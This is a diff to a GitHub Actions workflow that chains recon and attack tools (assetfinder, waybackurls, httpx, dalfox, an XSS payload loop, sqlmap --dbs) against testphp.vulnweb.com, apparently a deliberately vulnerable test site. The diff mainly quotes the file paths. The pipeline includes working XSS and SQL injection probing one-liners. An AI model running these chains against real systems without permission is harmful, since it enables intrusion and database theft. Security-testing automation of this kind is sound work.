@@ -72,56 +72,56 @@ jobs:
 
       - name: Run assetfinder
         run: |
-          ~/go/bin/assetfinder --subs-only testphp.vulnweb.com > ${{runner.temp}}/assetfinder.out
+          ~/go/bin/assetfinder --subs-only testphp.vulnweb.com > "${{ runner.temp }}/assetfinder.out"
         shell: bash
 
       - name: Run httprobe
         run: |
-          cat ${{runner.temp}}/assetfinder.out | ~/go/bin/httprobe -c 50 > ${{runner.temp}}/httprobe.out
+          cat "${{ runner.temp }}/assetfinder.out" | ~/go/bin/httprobe -c 50 > "${{ runner.temp }}/httprobe.out"
         shell: bash
 
       - name: Run waybackurls
         run: |
-          echo testphp.vulnweb.com | ~/go/bin/waybackurls > ${{runner.temp}}/waybackurls.out
+          echo testphp.vulnweb.com | ~/go/bin/waybackurls > "${{ runner.temp }}/waybackurls.out"
         shell: bash
 
       - name: Run httpx
         run: |
-          cat ${{runner.temp}}/assetfinder.out | ~/go/bin/httpx -ports 80,443,8080,8443 -title -status-code -json > ${{runner.temp}}/httpx.out
+          cat "${{ runner.temp }}/assetfinder.out" | ~/go/bin/httpx -ports 80,443,8080,8443 -title -status-code -json > "${{ runner.temp }}/httpx.out"
         shell: bash
 
       - name: Run additional tools
         run: |
           # Additional commands
-          cat ${{runner.temp}}/assetfinder.out | ~/go/bin/anew ${{runner.temp}}/domains
-          cat ${{runner.temp}}/domains | ~/go/bin/httprobe -c 50 | ~/go/bin/anew ${{runner.temp}}/hosth
-          cat ${{runner.temp}}/hosth | ~/go/bin/fff -d 1 -S -o ${{runner.temp}}/roots
-          ~/go/bin/gf meg-headers < ${{runner.temp}}/roots
-          ~/go/bin/gf servers < ${{runner.temp}}/roots | ~/go/bin/anew ${{runner.temp}}/gf-servers
+          cat "${{ runner.temp }}/assetfinder.out" | ~/go/bin/anew "${{ runner.temp }}/domains"
+          cat "${{ runner.temp }}/domains" | ~/go/bin/httprobe -c 50 | ~/go/bin/anew "${{ runner.temp }}/hosth"
+          cat "${{ runner.temp }}/hosth" | ~/go/bin/fff -d 1 -S -o "${{ runner.temp }}/roots"
+          ~/go/bin/gf meg-headers < "${{ runner.temp }}/roots"
+          ~/go/bin/gf servers < "${{ runner.temp }}/roots" | ~/go/bin/anew "${{ runner.temp }}/gf-servers"
 
           # Run waybackpy for known URLs
-          waybackpy --url testphp.vulnweb.com --user_agent "my-user-agent" --known_urls > ${{runner.temp}}/waybackpy.out
+          waybackpy --url testphp.vulnweb.com --user_agent "my-user-agent" --known_urls > "${{ runner.temp }}/waybackpy.out"
 
           # Run additional security scans
           echo "assets.testphp.vulnweb.com" | ~/go/bin/waybackurls | ~/go/bin/httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe
 
           # Simple Reflected XSS
-          subfinder -d testphp.vulnweb.com | ~/go/bin/httprobe -c 100 > ${{runner.temp}}/target.txt
-          cat ${{runner.temp}}/target.txt | ~/go/bin/waybackurls | ~/go/bin/gf xss | kxxs
+          subfinder -d testphp.vulnweb.com | ~/go/bin/httprobe -c 100 > "${{ runner.temp }}/target.txt"
+          cat "${{ runner.temp }}/target.txt" | ~/go/bin/waybackurls | ~/go/bin/gf xss | kxxs
 
           # Wayback URL collecting
-          cat ${{runner.temp}}/target.txt | ~/go/bin/waybackurls
+          cat "${{ runner.temp }}/target.txt" | ~/go/bin/waybackurls
 
           # SQL Injection
-          subfinder -d testphp.vulnweb.com | tee -a ${{runner.temp}}/domains
-          cat ${{runner.temp}}/domains | ~/go/bin/httpx | tee -a ${{runner.temp}}/alive.txt
-          cat ${{runner.temp}}/alive.txt | ~/go/bin/waybackurls | tee -a ${{runner.temp}}/urls
-          ~/go/bin/gf sqli ${{runner.temp}}/urls >> ${{runner.temp}}/sqli
-          sqlmap -m ${{runner.temp}}/sqli --dbs --batch
+          subfinder -d testphp.vulnweb.com | tee -a "${{ runner.temp }}/domains"
+          cat "${{ runner.temp }}/domains" | ~/go/bin/httpx | tee -a "${{ runner.temp }}/alive.txt"
+          cat "${{ runner.temp }}/alive.txt" | ~/go/bin/waybackurls | tee -a "${{ runner.temp }}/urls"
+          ~/go/bin/gf sqli "${{ runner.temp }}/urls" >> "${{ runner.temp }}/sqli"
+          sqlmap -m "${{ runner.temp }}/sqli" --dbs --batch
 
           # SQL Injection One-liner
-          findomain -t testphp.vulnweb.com -q | ~/go/bin/httpx -silent | ~/go/bin/anew | ~/go/bin/waybackurls | ~/go/bin/gf sqli >> ${{runner.temp}}/sqli
-          sqlmap -m ${{runner.temp}}/sqli -batch --random-agent --level 1
+          findomain -t testphp.vulnweb.com -q | ~/go/bin/httpx -silent | ~/go/bin/anew | ~/go/bin/waybackurls | ~/go/bin/gf sqli >> "${{ runner.temp }}/sqli"
+          sqlmap -m "${{ runner.temp }}/sqli" -batch --random-agent --level 1
 
           # Subdomains from Wayback Machine
           gau -subs testphp.vulnweb.com | cut -d / -f 3 | sort -u
@@ -129,13 +129,15 @@ jobs:
           # Collect .js files
           assetfinder testphp.vulnweb.com | ~/go/bin/waybackurls | grep -E "\\.js(?:onp?)?$" | ~/go/bin/anew
 
-        
+          
           # Vulnerability detection
-          cat ${{runner.temp}}/waybackurl | grep "php?id="
-          cat ${{runner.temp}}/waybackurl | grep ".xlsx"
+          cat "${{ runner.temp }}/waybackurl" | grep "php?id="
+          cat "${{ runner.temp }}/waybackurl" | grep ".xlsx"
 
           # XSS one-liner
-          cat ${{runner.temp}}/waybackurl | grep '=' | qsreplace '"><svg/onload=alert(1337)>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<svg/onload=alert(1337)>" && echo "$host \033[0;31mVulnerable"; done
+          cat "${{ runner.temp }}/waybackurl" | grep '=' | qsreplace '"><svg/onload=alert(1337)>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<svg/onload=alert(1337)>" && echo "$host \033[0;31mVulnerable"; done
 
           # Collect JS files using gau
-          gau -subs testphp.vulnweb.com | cut -d"?" -f1 | grep -E "\\.js(?:onp?)?$" | tee ${{runner.temp
+          gau -subs testphp.vulnweb.com | cut -d"?" -f1 | grep -E "\\.js(?:onp?)?$" | tee "${{ runner.temp }}/urls.txt"
+          sort -u "${{ runner.temp }}/urls.txt" | ~/go/bin/fff -o "${{ runner.temp }}/jsfiles"
+        shell: bash
